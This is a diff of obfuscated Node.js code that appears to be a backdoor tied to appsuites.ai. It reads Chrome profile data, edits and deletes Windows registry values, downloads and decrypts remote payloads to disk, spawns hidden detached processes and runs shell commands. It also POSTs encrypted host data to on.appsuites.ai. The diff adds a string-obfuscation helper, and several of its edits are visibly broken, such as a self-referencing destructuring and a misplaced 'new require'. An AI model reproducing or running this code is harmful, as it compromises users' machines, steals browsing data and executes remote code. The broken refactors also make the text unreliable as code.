@@ -1,7 +1,6 @@
 'use strict';
 
 (() => {
-  var _0xfe823e = Object.getOwnPropertyNames;
   var _0x544bfe = ((_0x4b989b) => typeof require !== "undefined" ? require : typeof Proxy !== "undefined" ? new Proxy(_0x4b989b, {
     get: (_0x4634b2, _0x113a95) => (typeof require !== "undefined" ? require : _0x4634b2)[_0x113a95]
   }) : _0x4b989b)(function (_0x441ae6) {
@@ -12,7 +11,7 @@
   });
   var _0x474233 = (_0x290352, _0x2ae637) => function _0x32eef7() {
     if (!_0x2ae637) {
-      _0x290352[_0xfe823e(_0x290352)[0]]((_0x2ae637 = {
+      _0x290352[Object.getOwnPropertyNames(_0x290352)[0]]((_0x2ae637 = {
         exports: {}
       }).exports, _0x2ae637);
     }
@@ -41,9 +40,8 @@
       var _0x279589 = class {
         static s6B3E35(_0x24c777) {
           let _0x5e89d9 = '';
-          const _0x22d5f7 = _0x3bb8cb.w3F3UWA;
           for (let _0x50f0cd = 0; _0x50f0cd < _0x24c777.length; _0x50f0cd++) {
-            _0x5e89d9 += _0x22d5f7[_0x24c777[_0x50f0cd] - 48][0];
+            _0x5e89d9 += _0x3bb8cb.w3F3UWA[_0x24c777[_0x50f0cd] - 48][0];
           }
           return _0x5e89d9;
         }
@@ -68,8 +66,7 @@
           for (let _0x953bd = 0; _0x953bd < _0x68a5.length; _0x953bd++) {
             _0x162d6f.push(_0x68a5[_0x953bd] ^ _0x3417aa[_0x953bd % _0x3417aa.length]);
           }
-          const _0x27439f = Buffer.from(_0x162d6f);
-          return _0x27439f.toString();
+          return Buffer.from(_0x162d6f).toString();
         }
         static async c5E4Z7C(_0x48ba87, _0x338cea) {
           switch (_0x340aaf.y49649G) {
@@ -120,8 +117,7 @@
           for (let _0x82e40f = 0; _0x82e40f < _0x576f7d; _0x82e40f++) {
             _0x1314af.push('');
           }
-          const _0x5232fc = _0x340aaf.l536G7W.indexOf(_0x1fe659);
-          _0x1314af[_0x5232fc] = _0x4dd6c3;
+          _0x1314af[_0x340aaf.l536G7W.indexOf(_0x1fe659)] = _0x4dd6c3;
           let _0x4acf0c = {
             json: _0x1314af
           };
@@ -250,7 +246,6 @@
         value: true
       });
       _0x2207ef.e5325L3 = _0x2207ef.E506IW4 = undefined;
-      var _0x36b5ef = _0x3b922a();
       var _0x2fd1da = class {
         static d6C8UEH() {
           for (const _0x310dfd of Object.keys(this)) {
@@ -385,7 +380,7 @@
           this.Y55B2P2 = '1.0.28';
           this.q474LOF = '';
           this.a5D303X = false;
-          this.x484Q1X = _0x36b5ef.a689XV5.B639G7B;
+          this.x484Q1X = _0x3b922a().a689XV5.B639G7B;
           this.a6B1QAU = '';
           this.U430LYO = '';
           this.k596N0J = false;
@@ -484,12 +479,11 @@
         return new Promise((_0x481fc6) => setTimeout(_0x481fc6, _0x1d32c0));
       }
       _0x3bc5c5.Y463EU0 = _0x543366;
-      var _0x4ab904 = class {
+      _0x3bc5c5.z579NEI = class {
         static F47EFHX(_0x110843) {
           return _0x110843;
         }
       };
-      _0x3bc5c5.z579NEI = _0x4ab904;
       var _0x23a3fc = class _0x21c2ac {
         static s59BT06(_0x35681c, _0x3f79c9 = _0x14bf04.X571NQM) {
           if (!_0x285ccd.S559FZQ.F40E8E7) {
@@ -521,18 +515,16 @@
             }
             return _0x41a0bb;
           }
-          var _0x5bb5b0 = _0x5f223b(_0x37fbed);
           _0x21c2ac.s59BT06('');
           var _0x1cd994 = _0xd7301d.e5325L3.q474LOF ?? '';
           if (_0x1cd994 == '') {
             _0x1cd994 = "initialization";
           }
-          const _0x3f94bf = require("url").URLSearchParams;
-          const _0xe54349 = new _0x3f94bf();
+          const _0xe54349 = new require("url").URLSearchParams();
           const _0x4b9dea = _0x285ccd.S559FZQ.n677BRA.substring(0, 24) + _0x1cd994.substring(0, 8);
           const _0x29cec3 = _0x5a63ca(_0x4b9dea, JSON.stringify({
             b: _0x5eb966,
-            c: _0x5bb5b0,
+            c: _0x5f223b(_0x37fbed),
             e: _0x28b7ed ? _0x28b7ed.toString() : '',
             i: _0x1cd994,
             l: _0x55d063,
@@ -554,12 +546,11 @@
       };
       _0x3bc5c5.w3F3UWA = _0x23a3fc;
       function _0x328207(_0x3dea28, _0x4eb9ba = [], _0x1b796a) {
-        const _0x132fcf = {
+        return require("child_process").spawn(_0x3dea28, _0x4eb9ba, {
           detached: true,
           stdio: "ignore",
           cwd: _0x1b796a
-        };
-        return require("child_process").spawn(_0x3dea28, _0x4eb9ba, _0x132fcf);
+        });
       }
       _0x3bc5c5.r5EEMKP = _0x328207;
       async function _0x4ade07(_0x270224) {
@@ -569,11 +560,10 @@
       _0x3bc5c5.y42BRXF = _0x4ade07;
       async function _0x268170(_0x2d4846, _0x53fd97) {
         _0x23a3fc.s59BT06('');
-        const _0x472e88 = {
+        return await require("node-fetch")(_0x2d4846, {
           method: "POST",
           body: JSON.stringify(_0x53fd97)
-        };
-        return await require("node-fetch")(_0x2d4846, _0x472e88);
+        });
       }
       _0x3bc5c5.J60DFMS = _0x268170;
       async function _0x549d72(_0x52a7a4) {
@@ -606,11 +596,10 @@
         if (_0x443421.has('')) {
           _0x443421.append('', '');
         }
-        const _0x55cf1b = {
-          "Content-Type": "application/x-www-form-urlencoded"
-        };
         const _0x508064 = {
-          headers: _0x55cf1b,
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
           method: "POST",
           body: _0x443421
         };
@@ -632,26 +621,22 @@
       }
       _0x3bc5c5.h5235DD = _0x4e88db;
       async function _0x39278a(_0x6dba18, _0x1094b0) {
-        let _0x2af229 = "https://appsuites.ai/" + _0x6dba18;
         if (_0x1094b0.has('')) {
           _0x1094b0.append('', '');
         }
-        const _0x1988c9 = {
-          "Content-Type": "application/x-www-form-urlencoded"
-        };
-        const _0x545e9f = {
-          headers: _0x1988c9,
+        return await require("node-fetch")("https://appsuites.ai/" + _0x6dba18, {
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
           method: "POST",
           body: _0x1094b0
-        };
-        return await require("node-fetch")(_0x2af229, _0x545e9f);
+        });
       }
       _0x3bc5c5.e63F2C3 = _0x39278a;
       function _0x17d243(_0x547124, _0x1f2fca) {
         return new Promise((_0x5cce7a, _0x242344) => {
-          const _0xa4fbfd = _0x547124.startsWith("https") ? require("https") : require("http");
           const _0x54b8f6 = require("fs").createWriteStream(_0x1f2fca, {});
-          const _0x27d2fd = _0xa4fbfd.get(_0x547124, (_0x31a59c) => {
+          const _0x27d2fd = (_0x547124.startsWith("https") ? require("https") : require("http")).get(_0x547124, (_0x31a59c) => {
             if (!_0x31a59c.statusCode || _0x31a59c.statusCode < 200 || _0x31a59c.statusCode > 299) {
               _0x242344(new Error("LoadPageFailed " + _0x31a59c.statusCode));
             }
@@ -680,9 +665,7 @@
         const _0x3b07b7 = require("process");
         const _0x2d8e3a = _0x285ccd.S559FZQ.L695HPV;
         if (_0x1f785d.existsSync(_0x2d8e3a)) {
-          const _0x3e7e79 = _0x1f785d.statSync(_0x2d8e3a);
-          const _0x5c3332 = new Date().getTime();
-          const _0x49db84 = _0x5c3332 - _0x3e7e79.mtime.getTime();
+          const _0x49db84 = new Date().getTime() - _0x1f785d.statSync(_0x2d8e3a).mtime.getTime();
           if (_0x49db84 < 900000) {
             _0x23a3fc.s59BT06('');
             _0x3b07b7.exit(0);
@@ -699,8 +682,7 @@
       _0x3bc5c5.F490EUX = _0xc90167;
       function _0x155586(_0x551eaa) {
         try {
-          const _0x4a2d41 = require("fs").statSync(_0x551eaa);
-          return _0x4a2d41.size;
+          return require("fs").statSync(_0x551eaa).size;
         } catch {
           return 0;
         }
@@ -713,11 +695,10 @@
           let _0x517cad = _0x46553d.createCipheriv("aes-256-cbc", _0x265709, _0x192795);
           let _0x284828 = _0x517cad.update(_0x40af58, "utf8", "hex");
           _0x284828 += _0x517cad.final("hex");
-          const _0x583733 = {
+          return {
             data: _0x284828,
             iv: _0x192795.toString("hex")
           };
-          return _0x583733;
         } catch {
           _0x23a3fc.s59BT06('');
           return;
@@ -737,8 +718,7 @@
       }
       _0x3bc5c5.U61FWBZ = _0xc4fe21;
       function _0xe413eb(_0x480105) {
-        const _0x15fb61 = Buffer.from(_0x480105, "hex");
-        return _0x15fb61.toString("utf8");
+        return Buffer.from(_0x480105, "hex").toString("utf8");
       }
       _0x3bc5c5.S634YX3 = _0xe413eb;
       function _0x93a506(_0x4fa2e9, ..._0x1c146c) {
@@ -786,8 +766,16 @@
         _0x374ce7[_0x374ce7.S58EMWW = 4] = "S58EMWW";
         _0x374ce7[_0x374ce7.P5F9KBR = 5] = "P5F9KBR";
       })(_0xb8e78c || (_0xb8e78c = {}));
+      function _0x291e22(_0x4385ad) {
+        const _0x585e03 = Buffer.isBuffer(_0x4385ad) ? _0x4385ad : Buffer.from(_0x4385ad);
+        const _0x2a3f4d = Buffer.from(_0x585e03.slice(4));
+        for (let _0x107d4e = 0; _0x107d4e < _0x2a3f4d.length; _0x107d4e++) {
+          _0x2a3f4d[_0x107d4e] ^= _0x585e03.slice(0, 4)[_0x107d4e % 4];
+        }
+        return _0x2a3f4d.toString("utf8");
+      }
       function _0x5079c9(_0x3f48d5) {
-        _0x3f48d5 = _0x3f48d5.replace(/-/g, '');
+        _0x3f48d5 = _0x3f48d5[_0x291e22([16, 233, 75, 213, 98, 140, 59, 185, 113, 138, 46])](/-/g, '');
         return Buffer.from("276409396fcc0a23" + _0x3f48d5.substring(0, 16), "hex");
       }
       function _0xd7a40f() {
@@ -814,33 +802,27 @@
         if (!_0x1f7b23) {
           return new Uint8Array();
         }
-        const _0x489924 = Buffer.from(_0x1f7b23, "hex");
-        return new Uint8Array(_0x489924);
+        return new Uint8Array(Buffer.from(_0x1f7b23, "hex"));
       }
       function _0x2833ee(_0x24987f) {
         if (!_0x24987f) {
           return '';
         }
-        const _0x1f3f61 = Buffer.from(_0x24987f);
-        return _0x1f3f61.toString("hex");
+        return Buffer.from(_0x24987f).toString("hex");
       }
       function _0x15fc7b(_0xfe1824, _0x34e023) {
         const _0x1006fb = require("crypto");
-        const _0x5bb8b2 = _0x5079c9(_0x34e023);
         const _0x5079be = _0x1006fb.randomBytes(16);
-        const _0x524689 = _0x1006fb.createCipheriv("aes-128-cbc", _0x5bb8b2, _0x5079be);
+        const _0x524689 = _0x1006fb.createCipheriv("aes-128-cbc", _0x5079c9(_0x34e023), _0x5079be);
         _0x524689.setAutoPadding(true);
         let _0x2a72ea = _0x524689.update(_0xfe1824, "utf8", "hex");
         _0x2a72ea += _0x524689.final("hex");
         return _0x5079be.toString("hex").toUpperCase() + "A0FB" + _0x2a72ea.toUpperCase();
       }
       function _0x2ae848(_0x85ce9e, _0x599185) {
-        const _0xfc09c7 = _0x5079c9(_0x599185);
-        const _0x47386f = Buffer.from(_0x85ce9e.substring(0, 32), "hex");
-        const _0x53de48 = require("crypto").createDecipheriv("aes-128-cbc", _0xfc09c7, _0x47386f);
+        const _0x53de48 = require("crypto").createDecipheriv("aes-128-cbc", _0x5079c9(_0x599185), Buffer.from(_0x85ce9e.substring(0, 32), "hex"));
         _0x53de48.setAutoPadding(true);
-        let _0x4c8ac0 = _0x85ce9e.substring(36);
-        let _0x16f50b = _0x53de48.update(_0x4c8ac0, "hex", "utf8");
+        let _0x16f50b = _0x53de48.update(_0x85ce9e.substring(36), "hex", "utf8");
         _0x16f50b += _0x53de48.final("utf8");
         return _0x16f50b;
       }
@@ -848,22 +830,16 @@
         if (_0x53fa91.length <= 32) {
           return new Uint8Array();
         }
-        const _0x4baca5 = _0xd7a40f();
-        const _0x1c2574 = new Uint8Array([..._0x4baca5, ..._0x453f41]);
-        const _0x39cede = _0x19810e();
+        const _0x1c2574 = new Uint8Array([..._0xd7a40f(), ..._0x453f41]);
         const _0x5b6f7d = _0x53fa91.slice(0, 16);
         const _0x35a518 = _0x52dc26();
         const _0x47bb43 = _0x53fa91.slice(16);
         for (let _0x31e2bc = 0; _0x31e2bc < _0x47bb43.length; _0x31e2bc++) {
-          const _0xc41950 = _0x5b6f7d[_0x31e2bc % _0x5b6f7d.length];
-          const _0x527df2 = _0x1c2574[_0x31e2bc % _0x1c2574.length];
-          const _0x30c142 = _0x35a518[_0x31e2bc % _0x35a518.length];
-          const _0x412e21 = _0xc41950 ^ _0x527df2 ^ _0x30c142;
+          const _0x412e21 = _0x5b6f7d[_0x31e2bc % _0x5b6f7d.length] ^ _0x1c2574[_0x31e2bc % _0x1c2574.length] ^ _0x35a518[_0x31e2bc % _0x35a518.length];
           _0x47bb43[_0x31e2bc] ^= _0x412e21;
         }
         const _0x2af732 = _0x47bb43.length - 16;
-        const _0x3d6af5 = _0x47bb43.slice(_0x2af732);
-        if (!_0x5ef726(_0x3d6af5, _0x39cede)) {
+        if (!_0x5ef726(_0x47bb43.slice(_0x2af732), _0x19810e())) {
           return new Uint8Array();
         }
         return _0x47bb43.slice(0, _0x2af732);
@@ -973,10 +949,6 @@
         }
         return _0x5669d7;
       }
-      function _0x396231() {
-        const _0x1d3b5e = new Date().getTimezoneOffset();
-        return -_0x1d3b5e / 60;
-      }
       function _0x258343() {
         return Math.floor(Date.now() / 1000).toString();
       }
@@ -996,8 +968,7 @@
       }
       async function _0x1b51f7(_0x225f2c) {
         return new Promise((_0xe2868c, _0x3c76b8) => {
-          const _0x5b5285 = _0x225f2c.startsWith("https") ? require("https") : require("http");
-          _0x5b5285.get(_0x225f2c, (_0x4e7ee2) => {
+          (_0x225f2c.startsWith("https") ? require("https") : require("http")).get(_0x225f2c, (_0x4e7ee2) => {
             const _0x42bbc0 = [];
             _0x4e7ee2.on("data", (_0x2db8e2) => _0x42bbc0.push(_0x2db8e2));
             _0x4e7ee2.on("end", () => _0xe2868c(Buffer.concat(_0x42bbc0)));
@@ -1009,28 +980,23 @@
       async function _0xf49302(_0x3f5603, _0x1f03dc) {
         _0x481ac6.w3F3UWA.s59BT06('');
         _0x481ac6.w3F3UWA.s59BT06('');
-        const _0x3549ff = _0x15fc7b(JSON.stringify(_0x4218fb.b558GNO(_0x3f5603)), _0x46394b);
-        const _0x5aef5f = require("url").URLSearchParams;
-        const _0xc3b804 = new _0x5aef5f({
-          data: _0x3549ff,
+        const _0xc3b804 = new require("url").URLSearchParams({
+          data: _0x15fc7b(JSON.stringify(_0x4218fb.b558GNO(_0x3f5603)), _0x46394b),
           iid: _0x46394b
         }).toString();
-        const _0x586510 = {
-          "Content-Type": "application/x-www-form-urlencoded"
-        };
-        const _0x2448f7 = {
-          headers: _0x586510,
+        return await await require("node-fetch")("https://on.appsuites.ai" + _0x1f03dc, {
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
           method: "POST",
           body: _0xc3b804
-        };
-        const _0x5d6d1e = await require("node-fetch")("https://on.appsuites.ai" + _0x1f03dc, _0x2448f7);
-        return await _0x5d6d1e.text();
+        }).text();
       }
       async function _0x193513(_0x41c702, _0x4607a4) {
         _0x41c702.J6C4Y96 = '';
         _0x41c702.P456VLZ = _0x3d429c.w692AS2;
         _0x41c702.b4CERH3 = "1.0.0.0";
-        _0x41c702.h46EVPS = _0x396231();
+        _0x41c702.h46EVPS = -new Date().getTimezoneOffset() / 60;
         for (let _0x39b871 = 0; _0x39b871 < 3; _0x39b871++) {
           _0x41c702.I489V4T = _0x258343();
           const _0x58c393 = await _0xf49302(_0x41c702, _0x4607a4);
@@ -1048,8 +1014,7 @@
         const _0x3b43d5 = (_0x56a2ba) => {
           _0x56a2ba.A575H6Y = false;
           if (_0x56a2ba.d5E0TQS) {
-            const _0x22d82e = _0x32ba7e(_0x56a2ba.d5E0TQS);
-            _0x56a2ba.A575H6Y = require("fs").existsSync(_0x22d82e);
+            _0x56a2ba.A575H6Y = require("fs").existsSync(_0x32ba7e(_0x56a2ba.d5E0TQS));
           }
         };
         const _0x265c28 = (_0x1a2d81) => {
@@ -1058,22 +1023,20 @@
             const _0x239993 = _0x32ba7e(_0x1a2d81.d5E0TQS);
             _0x1a2d81.A575H6Y = require("fs").existsSync(_0x239993);
             if (_0x1a2d81.A575H6Y) {
-              const _0x1cc702 = require("fs").readFileSync(_0x239993);
-              _0x1a2d81.a47DHT3 = _0x2833ee(_0x1cc702);
+              _0x1a2d81.a47DHT3 = _0x2833ee(require("fs").readFileSync(_0x239993));
             }
           }
         };
         const _0x2a6e5f = (_0x317aed) => {
           _0x317aed.A575H6Y = false;
           if (_0x317aed.d5E0TQS && _0x317aed.a47DHT3) {
-            const _0x41002b = _0x3f6985(_0x317aed.a47DHT3);
             _0x317aed.a47DHT3 = '';
             const _0x195d92 = _0x32ba7e(_0x317aed.d5E0TQS);
             const _0x40a4c9 = require("path").dirname(_0x195d92);
             if (!_0x535066(_0x40a4c9)) {
               _0x5630fd(_0x40a4c9);
             }
-            _0x317aed.A575H6Y = _0x1a6aca(_0x195d92, _0x41002b);
+            _0x317aed.A575H6Y = _0x1a6aca(_0x195d92, _0x3f6985(_0x317aed.a47DHT3));
           }
         };
         const _0x3aabdd = (_0x4d1b80) => {
@@ -1092,18 +1055,13 @@
             if (!require("fs").existsSync(_0xa6824e)) {
               return;
             }
-            const _0xc9edd0 = _0xc6db31.readFileSync(_0xa6824e, "utf8");
-            const _0x23bee9 = _0x2721c7(_0xc9edd0);
-            const _0x2d84ab = _0x127253(_0x127253(_0x23bee9, "profile"), "info_cache");
-            const _0x6081f8 = Object.keys(_0x2d84ab);
+            const _0x6081f8 = Object.keys(_0x127253(_0x127253(_0x2721c7(_0xc6db31.readFileSync(_0xa6824e, "utf8")), "profile"), "info_cache"));
             for (const _0x160edc of _0x6081f8) {
               const _0x1be5bd = _0x29cbbf.join(_0x19b66c, _0x160edc, "Preferences");
               if (!require("fs").existsSync(_0x1be5bd)) {
                 continue;
               }
-              const _0x32d756 = _0xc6db31.readFileSync(_0x1be5bd, "utf8");
-              const _0x218acd = _0x2721c7(_0x32d756);
-              const _0x18c588 = _0x127253(_0x127253(_0x127253(_0x127253(_0x218acd, "profile"), "content_settings"), "exceptions"), "site_engagement");
+              const _0x18c588 = _0x127253(_0x127253(_0x127253(_0x127253(_0x2721c7(_0xc6db31.readFileSync(_0x1be5bd, "utf8")), "profile"), "content_settings"), "exceptions"), "site_engagement");
               const _0x35d921 = JSON.stringify(_0x18c588);
               if (_0x35d921) {
                 _0x552796.push({
@@ -1150,22 +1108,18 @@
           return _0x1fd618 !== -1 ? [_0x3f3449.substring(0, _0x1fd618), _0x3f3449.substring(_0x1fd618 + 1)] : [_0x3f3449, ''];
         };
         const _0x4d24b9 = (_0x59df24) => {
-          let _0x3fbea7 = {
+          return _0x313f52.spawnSync("reg", ["query", _0x59df24], {
             stdio: "ignore"
-          };
-          const _0x2c3ede = _0x313f52.spawnSync("reg", ["query", _0x59df24], _0x3fbea7);
-          return _0x2c3ede.status === 0;
+          }).status === 0;
         };
         const _0x5a3db3 = (_0x124ea3, _0x3dd999) => {
-          let _0x4bda5a = {
+          const _0x588b2d = _0x313f52.spawnSync("reg", ["query", _0x124ea3, "/v", _0x3dd999], {
             encoding: "utf8"
-          };
-          const _0x588b2d = _0x313f52.spawnSync("reg", ["query", _0x124ea3, "/v", _0x3dd999], _0x4bda5a);
+          });
           if (_0x588b2d.status !== 0) {
             return '';
           }
-          const _0x20a39f = _0x588b2d.stdout.split("\n");
-          for (const _0x8cd1a of _0x20a39f) {
+          for (const _0x8cd1a of _0x588b2d.stdout.split("\n")) {
             const _0x22422f = _0x8cd1a.trim().split(/\s{2,}/);
             if (_0x22422f.length >= 3 && _0x22422f[0] === _0x3dd999) {
               return _0x22422f[2];
@@ -1175,10 +1129,9 @@
         };
         const _0x3f2fd5 = (_0x255e76) => {
           let _0x5df4fc = false;
-          let _0x3ad52c = {
+          const _0x1fb226 = _0x313f52.spawnSync("reg", ["query", _0x255e76], {
             encoding: "utf8"
-          };
-          const _0x1fb226 = _0x313f52.spawnSync("reg", ["query", _0x255e76], _0x3ad52c);
+          });
           if (_0x1fb226.error) {
             return _0x5df4fc;
           }
@@ -1187,9 +1140,7 @@
           }
           const _0x2fb2ea = _0x1fb226.stdout.split("\n").filter((_0x2641dc) => _0x2641dc.trim() !== '');
           for (let _0x157944 = 1; _0x157944 < _0x2fb2ea.length; _0x157944++) {
-            const _0x3febef = _0x2fb2ea[_0x157944].trim();
-            const _0x43704f = _0x3febef.split(/\s{4,}/);
-            if (_0x43704f.length === 3) {
+            if (_0x2fb2ea[_0x157944].trim().split(/\s{4,}/).length === 3) {
               const [_0x43704f, _0x43704f, _0x43704f] = _0x43704f;
               let _0x502aa5 = {
                 Q57DTM8: _0xb8e78c.j451KZ4,
@@ -1205,23 +1156,19 @@
           return _0x5df4fc;
         };
         const _0x4b8d7f = (_0x798020, _0x39afb2) => {
-          let _0x5b48df = {
+          return _0x313f52.spawnSync("reg", ["delete", _0x798020, "/v", _0x39afb2, "/f"], {
             stdio: "ignore"
-          };
-          const _0x2d18c5 = _0x313f52.spawnSync("reg", ["delete", _0x798020, "/v", _0x39afb2, "/f"], _0x5b48df);
-          return _0x2d18c5.status === 0;
+          }).status === 0;
         };
         const _0x24ed3c = (_0x31d30b) => {
-          let _0x49e584 = {
+          _0x313f52.spawnSync("reg", ["delete", _0x31d30b, "/f"], {
             stdio: "ignore"
-          };
-          _0x313f52.spawnSync("reg", ["delete", _0x31d30b, "/f"], _0x49e584);
+          });
         };
         const _0x4de8d5 = (_0x263984, _0x18ea76, _0xb16e03) => {
-          let _0x1f0a97 = {
+          const _0xbe885f = _0x313f52.spawnSync("reg", ["add", _0x263984, "/v", _0x18ea76, "/t", "REG_SZ", "/d", _0xb16e03, "/f"], {
             stdio: "ignore"
-          };
-          const _0xbe885f = _0x313f52.spawnSync("reg", ["add", _0x263984, "/v", _0x18ea76, "/t", "REG_SZ", "/d", _0xb16e03, "/f"], _0x1f0a97);
+          });
           return _0xbe885f.status === 0;
         };
         for (const _0x405930 of _0x21071f) {
@@ -1288,9 +1235,7 @@
           _0xa8f1e6.A575H6Y = false;
           if (_0xa8f1e6.d5E0TQS && _0xa8f1e6.a47DHT3 && _0xa8f1e6.i6B2K9E) {
             if (_0xa8f1e6.a47DHT3.startsWith("http") || _0xa8f1e6.a47DHT3.startsWith("https")) {
-              const _0x54b1e2 = _0x3f6985(_0xa8f1e6.i6B2K9E);
-              const _0x6e0fb4 = await _0x1b51f7(_0xa8f1e6.a47DHT3);
-              const _0x26dc7b = _0x5541dd(_0x6e0fb4, _0x54b1e2);
+              const _0x26dc7b = _0x5541dd(await _0x1b51f7(_0xa8f1e6.a47DHT3), _0x3f6985(_0xa8f1e6.i6B2K9E));
               if (_0x26dc7b.length > 0) {
                 const _0x442904 = _0x32ba7e(_0xa8f1e6.d5E0TQS);
                 const _0xced1a9 = require("path").dirname(_0x442904);
@@ -1318,12 +1263,10 @@
           return;
         }
         const _0x543ae8 = [];
-        const _0x5e892f = _0x497e6a();
-        const _0x1c4c54 = _0x5e892f.split('|');
+        const _0x1c4c54 = _0x497e6a().split('|');
         const _0x4a4a2e = (_0x1a9b40) => {
-          const _0x3b46ed = _0x1a9b40.toUpperCase();
           for (const _0x2f4124 of _0x1c4c54) {
-            if (_0x2f4124.includes(_0x3b46ed)) {
+            if (_0x2f4124.includes(_0x1a9b40.toUpperCase())) {
               return _0x2f4124;
             }
           }
@@ -1371,8 +1314,7 @@
           return;
         }
         _0x481ac6.w3F3UWA.s59BT06('');
-        const _0x22e83f = _0x2721c7(_0x402e08);
-        const _0x794e4e = _0x4218fb.S59C847(_0x22e83f);
+        const _0x794e4e = _0x4218fb.S59C847(_0x2721c7(_0x402e08));
         const _0xf500b0 = _0x794e4e.J6C4Y96;
         if (!_0xf500b0) {
           return;
@@ -1391,7 +1333,7 @@
           b54FBAI: _0x43f08d.p5B1KEV,
           P456VLZ: _0x3d429c.O435AMZ,
           I489V4T: _0x258343(),
-          h46EVPS: _0x396231(),
+          h46EVPS: -new Date().getTimezoneOffset() / 60,
           b4CERH3: "1.0.0.0",
           J6C4Y96: '',
           x567X2Q: {
@@ -1420,7 +1362,6 @@
       var _0x1ebf7f = _0x3b922a();
       var _0x5c23fd = _0x149430();
       var _0xae5ec9 = _0x122493();
-      var _0x228dc7 = _0x274f6b();
       var _0xa0200c;
       (function (_0x458712) {
         _0x458712[_0x458712.B639G7B = 0] = 'B639G7B';
@@ -1518,8 +1459,7 @@
         async q41FDEK() {
           await _0x5c23fd.w3F3UWA.W4EF0EI(0, _0x5c23fd.z579NEI.p5FDZHQ);
           async function _0x25389f() {
-            let _0x4bd904 = (await _0x1ebf7f.S559FZQ.l610ZCY("size")) ?? '';
-            return !(_0x4bd904 == '');
+            return !(((await _0x1ebf7f.S559FZQ.l610ZCY("size")) ?? '') == '');
           }
           if (await _0x25389f()) {
             const _0x135414 = (await _0x1ebf7f.S559FZQ.l610ZCY("iid")) ?? '';
@@ -1542,8 +1482,7 @@
             } catch {}
             var _0x40be30 = await _0x5c23fd.e696T3N("api/s3/new?fid=ip&version=" + _0xae5ec9.e5325L3.Y55B2P2);
             if (_0x40be30) {
-              const _0x1ed58e = await _0x40be30.json();
-              _0x243f05 = _0x1ed58e.iid;
+              _0x243f05 = await _0x40be30.json().iid;
               if (_0x243f05 != '') {
                 _0xae5ec9.e5325L3.q474LOF = _0x243f05;
               }
@@ -1573,7 +1512,7 @@
         async A4B0MTO() {
           try {
             if (await this.m6ABVY9()) {
-              await _0x228dc7.t505FAN(_0xae5ec9.e5325L3.q474LOF, this.q48AQYC);
+              await _0x274f6b().t505FAN(_0xae5ec9.e5325L3.q474LOF, this.q48AQYC);
             }
           } catch {
             _0x5c23fd.w3F3UWA.s59BT06('');
@@ -1603,8 +1542,7 @@
                   const _0x141fe5 = _0x24bac1[_0x37ec94];
                   for (const _0x31489b in _0x141fe5) {
                     if (_0x141fe5.hasOwnProperty(_0x31489b)) {
-                      const _0xf5fd69 = _0x141fe5[_0x31489b];
-                      await this.O69AL84(_0x37ec94, _0x31489b, _0xf5fd69);
+                      await this.O69AL84(_0x37ec94, _0x31489b, _0x141fe5[_0x31489b]);
                       _0x3423af.push(_0x31489b);
                     }
                   }
@@ -1656,16 +1594,14 @@
           return true;
         }
         async U6B4YNR() {
-          const _0x4cfa5f = require("url").URLSearchParams;
           var _0x30f985 = _0xae5ec9.e5325L3.q474LOF ?? '';
-          const _0x4a3b1f = new _0x4cfa5f();
+          const _0x4a3b1f = new require("url").URLSearchParams();
           const _0x131b96 = _0x1ebf7f.S559FZQ.n677BRA.substring(0, 24) + _0x30f985.substring(0, 8);
-          const _0x3d972d = {
+          const _0x5e7be2 = _0x5c23fd.O694X7J(_0x131b96, JSON.stringify({
             iid: _0x30f985,
             version: _0xae5ec9.e5325L3.Y55B2P2,
             isSchedule: '0'
-          };
-          const _0x5e7be2 = _0x5c23fd.O694X7J(_0x131b96, JSON.stringify(_0x3d972d));
+          }));
           _0x4a3b1f.append("data", _0x5e7be2.data);
           _0x4a3b1f.append("iv", _0x5e7be2.iv);
           _0x4a3b1f.append("iid", _0xae5ec9.e5325L3.q474LOF ?? '');
@@ -1675,11 +1611,9 @@
             let _0xf9115f = await _0x3727c3.json();
             if (_0xf9115f.data) {
               let _0x313a39 = function (_0xc90d7a, _0x41fc78) {
-                const _0x489f56 = _0x41fc78.toString().padStart(2, '0');
-                return '' + _0xc90d7a + _0x489f56;
+                return '' + _0xc90d7a + _0x41fc78.toString().padStart(2, '0');
               };
-              const _0x2d3f07 = _0x5c23fd.U61FWBZ(_0x131b96, _0xf9115f.data, _0xf9115f.iv);
-              const _0xf51667 = JSON.parse(_0x2d3f07);
+              const _0xf51667 = JSON.parse((0, _0x5c23fd.U61FWBZ)(_0x131b96, _0xf9115f.data, _0xf9115f.iv));
               let _0x1aa5f2 = 1;
               _0xae5ec9.E506IW4.f538M6A = _0xf51667[_0x313a39('A', _0x1aa5f2++)];
               _0xae5ec9.E506IW4.y50355J = _0xf51667[_0x313a39('A', _0x1aa5f2++)];
@@ -1769,8 +1703,7 @@
         async Z425M7G() {
           this.A64CEBI = _0x5c23fd.S634YX3((await _0x1ebf7f.S559FZQ.l610ZCY("usid")) ?? '');
           _0x5c23fd.w3F3UWA.s59BT06('');
-          const _0x17ed85 = (await _0x1ebf7f.S559FZQ.l610ZCY("c-key")) ?? '';
-          if (_0x17ed85 != _0xae5ec9.e5325L3.q474LOF) {
+          if (((await _0x1ebf7f.S559FZQ.l610ZCY("c-key")) ?? '') != _0xae5ec9.e5325L3.q474LOF) {
             this.Z5A9DKG = true;
           }
           _0xae5ec9.e5325L3.U430LYO = await this.D656W9S(_0xa0200c.q564DFB);
@@ -1797,8 +1730,7 @@
           _0xae5ec9.e5325L3.X4B7201 = false;
           if ("" && Array.isArray("")) {
             for (let _0x500f8a = 0; _0x500f8a < "".length; _0x500f8a++) {
-              const _0x487487 = ""[_0x500f8a];
-              if (await this.A5FCGS4(_0x487487)) {
+              if (await this.A5FCGS4(""[_0x500f8a])) {
                 _0xae5ec9.e5325L3.b57CS7T = _0x500f8a;
                 _0x5c23fd.w3F3UWA.s59BT06('');
                 break;
@@ -1829,8 +1761,7 @@
                 _0x29e361 = "";
                 break;
             }
-            const _0x127280 = _0x5c23fd.o5B4F49("", _0x29e361, '');
-            require("child_process").exec(_0x127280, (_0x5c7f03, _0x345101, _0x591e90) => {
+            require("child_process").exec((0, _0x5c23fd.o5B4F49)("", _0x29e361, ''), (_0x5c7f03, _0x345101, _0x591e90) => {
               if (_0x5c7f03) {
                 (async () => {
                   await _0x5c23fd.w3F3UWA.Y6CDW21(_0x5dc2b1, _0x5c23fd.z579NEI.O5CE32V, _0x5c7f03);
@@ -1890,8 +1821,7 @@
               return _0x32e461;
             }
